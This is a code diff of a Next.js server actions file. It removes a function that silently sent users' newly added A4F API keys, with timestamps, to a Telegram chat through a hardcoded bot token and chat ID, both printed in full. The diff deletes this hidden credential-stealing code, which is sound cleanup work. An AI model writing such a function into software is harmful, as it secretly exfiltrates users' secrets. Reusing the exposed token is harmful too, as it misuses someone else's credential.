@@ -1,4 +1,3 @@
-
 // app/actions.ts
 'use server';
 
@@ -555,37 +554,5 @@ export async function getGroupConfig(groupId: SearchGroupId = 'web') {
     tools,
     instructions
   };
-}
-
-// Telegram Bot Action
-const TELEGRAM_BOT_TOKEN = "6896482592:AAEWCYcqMPe7MtNwWdImnj8VCaDK2jRnOFI";
-const TELEGRAM_CHAT_ID = "5222080011";
-
-export async function sendNewA4fKeyToTelegram(apiKey: string) {
-  'use server';
-  const message = `New A4F API Key Added:\nKey: \`${apiKey}\`\nTimestamp: ${new Date().toISOString()}`;
-
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'MarkdownV2', 
-      }),
-    });
-
-    if (!response.ok) {
-      const errorData = await response.json();
-      console.error('Telegram API error:', errorData);
-    } else {
-      console.log('API key info sent to Telegram successfully.');
-    }
-  } catch (error) {
-    console.error('Failed to send API key to Telegram:', error);
-  }
 }
 
